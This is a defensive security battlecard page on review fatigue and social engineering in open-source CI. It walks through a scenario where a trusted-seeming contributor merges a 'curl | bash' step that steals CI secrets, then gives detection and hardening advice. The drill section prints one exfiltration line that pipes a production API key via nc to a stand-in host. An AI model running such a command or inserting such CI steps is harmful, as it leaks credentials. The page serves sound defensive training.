---
 permalink: /battcards/developer-review-fatigue-and-social-engineering
battlecard:
 title: Developer Review Fatigue and Social Engineering
 category: Social Engineering
 scenario: Human-Ops: Review Fatigue & Social Engineering
 focus: 
   - helpful maintainer PRs 
   - urgency scams 
   - pressure to merge CI fixes quickly 
---

An attacker, posing as a new and helpful contributor named "Alex," targets a popular open-source project. The project is maintained by a small group of overworked developers who are struggling to keep up with the volume of issues and pull requests (PRs).

Alex's campaign starts slowly. They submit several small, genuinely helpful PRs: fixing typos in documentation, adding a missing unit test, and refactoring a small piece of code for clarity. The maintainers appreciate the help and quickly merge these changes, building a sense of trust and goodwill. Alex becomes a familiar, positive presence.

One Friday afternoon, the project's Continuous Integration (CI) build suddenly starts failing on the main branch due to a flaky test in a newly added dependency. Alex, who has been monitoring the project's activity, immediately springs into action. They submit a PR titled "URGENT FIX: Repairing CI pipeline failure." The PR description explains that a subtle change in the dependency requires a temporary workaround and that this PR will unblock all other developers.

The change involves modifying the `ci.yml` file to add a `curl | bash` command that ostensibly downloads a specific, patched version of a build tool. However, the script it downloads is malicious. It's designed to scan the CI runner's environment variables, exfiltrate any secrets it finds (like `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`), and then exit cleanly, allowing the rest of the build to pass.

Seeing the "URGENT FIX" and wanting to unblock the team before the weekend, a fatigued maintainer gives the PR a quick, cursory review. Recognizing Alex as a trusted contributor and feeling the pressure to fix the pipeline, they merge the PR. The malicious code executes on the next commit, stealing the project's secrets.

{% block type='battlecard' text='Reconnaissance' %}
### Explanation
This is the attacker's intelligence-gathering phase. They aren't running network scanners; they are studying the human and process elements of your project. The goal is to understand the project's culture, workflows, and key players to identify the path of least resistance. The attacker will analyze public data to build a social graph of the project, identifying overworked maintainers, the typical PR review process, and technical details of the build pipeline.

### Insight
Your project's public activity on platforms like GitHub is a goldmine for an attacker. They can learn who is likely to approve PRs quickly, who seems stressed or overworked (based on comments), and what times of day the team is most active or most vulnerable (e.g., late on a Friday). They are looking for process gaps, not just code vulnerabilities.

### Practical
As a developer, be aware that your contribution history, comments, and interactions are public.
- Review your project's contributor graph. Who are the top committers? Are they all still active?
- Read through recent, highly-commented PRs. What is the tone? Does it indicate a stressed or fatigued review culture?
- Examine your CI configuration files (`.github/workflows/`, `.gitlab-ci.yml`). They are public and tell an attacker exactly what tools you use, what scripts you run, and how your pipeline is structured.

### Tools/Techniques
- **GitHub's Contributor Graph**: Use the built-in [graphs](https://docs.github.com/en/repositories/viewing-activity-and-data-for-your-repository/viewing-repository-activity-with-graphs) to see who the key players are and their activity levels.
- **Git History Analysis**: Use command-line tools like `git shortlog -sn` to quickly see top contributors.
- **Public Log Mining**: An attacker might browse public CI logs (if available) to understand build dependencies and common failure points they could later exploit as a pretext.

### Metrics/Signal
- **High PR-to-Maintainer Ratio**: A large number of open PRs compared to the number of active maintainers can signal a team under pressure.
- **Stale PRs**: A high number of PRs that have been open for weeks or months can indicate review fatigue, making the team more susceptible to a "quick fix" for a new, urgent issue.

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
This stage is about self-assessment. A developer or team should look at their own environment and processes through the lens of the attacker. The goal is to identify the specific weaknesses that would allow the "Helpful Maintainer" scenario to succeed. It's not about a single vulnerability but a chain of process and configuration weaknesses.

### Insight
The most critical vulnerability is often not in the code itself, but in the *process of changing the code*. If your review and merge process relies solely on human diligence without automated safeguards, it is vulnerable to social engineering, especially under pressure.

### Practical
Hold a team meeting and ask these questions:
- **Review Process**: Do we require more than one reviewer for PRs, especially for changes to critical files like `ci.yml` or `package.json`?
- **Contributor Trust**: How do we establish trust with new contributors? Is there a waiting period or a requirement for multiple successful PRs before they are considered "trusted"?
- **Urgency Policy**: Do we have a documented process for handling "urgent" fixes? Does it bypass or relax our standard security checks?
- **Ownership**: Who is responsible for reviewing changes to the build pipeline? Is it clearly defined?

### Tools/Techniques
- **CODEOWNERS**: Check if you have a [`CODEOWNERS` file](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners) in GitHub/GitLab. Does it specify owners for critical configuration files and infrastructure-as-code?
- **Branch Protection Rules**: Go into your repository settings and review your branch protection rules. Are they enforced for all maintainers? Do they require status checks to pass before merging?
- **[OpenSSF Scorecard](https://github.com/ossf/scorecard)**: Run this automated tool against your repository. It will check for many best practices, including code review policies, and give you a score.

### Metrics/Signal
- **Percentage of PRs merged with a single review**: A high percentage indicates a lack of mandatory peer review.
- **Absence of a `CODEOWNERS` file**: A clear signal that ownership of critical code paths is not formally defined or enforced.
- **Admin/Maintainer "Merge without review" frequency**: If maintainers frequently use their privileges to bypass checks, this is a major process vulnerability.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
Fortification involves hardening your development practices, tools, and configurations to make the social engineering attack much harder to execute. The focus is on removing single points of failure (like a single tired reviewer) and using automation to enforce security policies consistently.

### Insight
You cannot completely eliminate human error, but you can build a system of guardrails that makes it harder for a single person's mistake to become a security catastrophe. Codify your trust policies into automated checks that run on every single PR, regardless of who submitted it.

### Practical
- **Enforce Multiple Reviews**: Configure branch protection to require at least two approvals for every PR, especially for changes to CI/CD files.
- **Define Code Owners**: Create a `CODEOWNERS` file that automatically requests reviews from the security team or pipeline specialists whenever build configurations are modified.
- **Adopt a Tiered Trust Model**: Formalize the process for new contributors. For example, their first few PRs might require more rigorous review from multiple core maintainers.
- **Secure Your Build Scripts**: Avoid dangerous patterns like `curl | bash`. Instead, pull versioned and signed artifacts (like container images or compiled tools) from a trusted registry.

### Tools/Techniques
- **[GitHub Branch Protection Rules](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/defining-the-mergeability-of-pull-requests/about-protected-branches)**: Require status checks, conversation resolution, and multiple approving reviews.
- **[GitLab Protected Branches](https://docs.gitlab.com/ee/user/project/protected_branches.html)**: Similar functionality for GitLab users to enforce review policies.
- **[Sigstore](https://www.sigstore.dev/)**: Implement cryptographic signing for commits and build artifacts. This helps verify that the code being merged and run was written by a known, trusted developer.
- **[StepSecurity Harden-Runner](https://github.com/step-security/harden-runner)**: A GitHub Action that hardens your CI/CD runners by monitoring and blocking outbound traffic, helping to prevent `curl | bash` style exfiltration.

### Metrics/Signal
- **100% of production branches are covered by branch protection rules.**
- **Critical file paths (e.g., `/.github/workflows/`, `package-lock.json`) are all mapped in the `CODEOWNERS` file.**
- **Decrease in the number of PRs merged by non-members or new members without multiple reviews.**

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
This stage assumes the attacker has succeeded—the malicious PR has been merged. The goal now is to contain the "blast radius." Limiting damage means ensuring that the compromised code running in your CI/CD pipeline has the absolute minimum privileges necessary and cannot access critical, long-lived secrets or other production systems.

### Insight
Treat your CI/CD environment as a zero-trust environment. A script running for a PR from a first-time contributor should not have the same level of access as a deployment script running from the main branch. Assume that any code running in CI could be malicious.

### Practical
- **Scope Your Secrets**: Never use global, long-lived secrets. Use environment-specific secrets that are only exposed to jobs that absolutely need them.
- **Use Short-Lived Credentials**: Instead of storing static `AWS_ACCESS_KEY_ID`s, configure your CI/CD pipeline to assume an IAM Role via OIDC. The credentials will be temporary and automatically expire.
- **Isolate Build Steps**: Run your build and test jobs in sandboxed environments like containers with no network access by default. Only grant network access to specific steps that require it (e.g., downloading dependencies).
- **Network Egress Controls**: Configure firewalls for your CI runners to only allow outbound traffic to known, trusted domains (e.g., your package registry, your cloud provider's API).

### Tools/Techniques
- **[GitHub Actions Environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)**: A powerful feature for creating protection rules and scoping secrets to specific deployment environments (e.g., `prod` vs `staging`).
- **Cloud Provider OIDC Integration**: Configure trust between your Git provider and your cloud to enable passwordless, short-lived access. See guides for [GitHub](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services), [GitLab](https://docs.gitlab.com/ee/ci/cloud_services/aws/), and [Google Cloud](https://cloud.google.com/iam/docs/workload-identity-federation).
- **[HashiCorp Vault](https://www.vaultproject.io/)**: A dedicated secrets management tool that can generate dynamic, on-demand secrets for your CI jobs.

### Metrics/Signal
- **Number of static, long-lived secrets stored in your CI/CD system**: This number should trend towards zero.
- **Time-To-Live (TTL) on temporary credentials**: Shorter is better. A 15-minute credential is much less risky than one that lasts for 24 hours.
- **Percentage of CI jobs running with unrestricted network access**: This should be low and limited to only specific, audited jobs.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
Expose is about detection and response. How do you know an attack is happening or has already occurred? This requires monitoring, logging, and alerting on suspicious activities within your development lifecycle, particularly in your CI/CD pipeline. You need visibility into what your code and processes are *actually* doing.

### Insight
The attacker's malicious code has to perform an action to be useful—exfiltrate data, download more malware, or manipulate a build artifact. These actions often create anomalies that deviate from the normal baseline of activity. Your goal is to detect these deviations in near real-time.

### Practical
- **Log Everything in CI**: Ensure your CI jobs log all executed commands, network connections made, and files accessed.
- **Establish a Baseline**: Understand what normal CI/CD behavior looks like. What domains do your builds typically connect to? What processes do they normally run?
- **Set Up Anomaly Alerts**: Create alerts for when a CI job deviates from the baseline. For example, alert when a test job tries to make an outbound network connection to an unknown IP address, or when a script accesses a secret it's not supposed to.
- **Audit Git Activity**: Monitor for unusual commit patterns, such as a new contributor force-pushing or modifying commit author information.

### Tools/Techniques
- **Runtime Security Monitoring**: Tools like [Falco](https://falco.org/) or [Tetragon](https://github.com/cilium/tetragon) can be deployed to your CI runners to monitor system calls and detect suspicious behavior in real-time (e.g., "Process curl opened a network connection to a non-allowed IP").
- **Log Aggregation Platforms**: Send all your CI/CD and Git server logs to a central platform like [OpenSearch](https://opensearch.org/), Splunk, or Datadog. This allows you to search, analyze, and create dashboards and alerts.
- **[Socket.dev](https://socket.dev)** or **[Snyk](https://snyk.io/)**: These tools can detect when a newly added open-source dependency exhibits risky behavior (like network access or filesystem writes) during installation, which can be a sign of a trojanized package.
- **[Git-Secrets](https://github.com/awslabs/git-secrets)**: A pre-commit hook to prevent you from accidentally committing secrets in the first place.

### Metrics/Signal
- **Alert on Unexpected Network Egress**: A CI job for a documentation change trying to connect to a random IP address is a major red flag.
- **Alert on Unexpected Process Execution**: A build script spawning `nmap` or `whoami` is highly suspicious.
- **Spike in Secret Access**: A sudden increase in the number of secrets being accessed by a specific CI job could indicate a breach.

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
This stage is about proactive practice. Just like a fire drill, you need to test your defenses and your team's response to a simulated attack. By running controlled security exercises, developers build the "muscle memory" needed to spot and react to social engineering tactics before they cause real damage.

### Insight
Reading about a threat is not the same as experiencing it. A well-run exercise will expose the gaps between your documented process and what people actually do when faced with a plausible, urgent request. The goal is not to "catch" people, but to learn and improve together.

### Practical
1.  **Plan a Tabletop Exercise**: Schedule a 1-hour meeting. Present the team with the exact scenario described above. "A trusted new contributor has submitted an urgent PR to fix the build. It looks like this... What do you do?" Walk through the process step-by-step and document the team's responses.
2.  **Run a Live Fire Drill**:
*   Create a new, temporary GitHub account.
*   Use this account to submit a few harmless PRs to a non-production repository over a week to build a history.
*   Submit a "malicious" PR. It doesn't need to be truly malicious; it can be something obvious upon inspection, like `echo "export API_KEY=$PROD_API_KEY" | nc evil-server.com 1337`.
*   Post a message in the team's Slack channel: "@here, the build is broken! Can someone please review and merge [link to PR] from this new contributor so we can get unblocked?"
*   Observe the response. Who reviews it? How thoroughly? Do they merge it?
3.  **Conduct a Post-Mortem**: After the exercise, hold a blameless post-mortem. What went well? Where did the process break down? What can be improved? Update your documentation and branch protection rules based on the findings.

### Tools/Techniques
- **Dedicated Test Repository**: Never run live security exercises against your production code repositories.
- **[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)**: While focused on endpoint security, its principles of small, testable attack simulations can be adapted to create CI/CD attack scenarios.
- **Internal Documentation**: Use your team's wiki (e.g., Confluence, Notion) to document the exercise plan, the results, and the action items for improvement.

### Metrics/Signal
- **Time-to-Detection**: How long did it take for someone on the team to identify the simulated malicious PR?
- **Exercise Success/Fail Rate**: Did the PR get approved and merged, or was it correctly blocked? Track this over time to see improvement.
- **Number of Process Improvements Generated**: A successful exercise should result in concrete changes, such as a new branch protection rule, an updated `CODEOWNERS` file, or improved team training.
{% endblock %}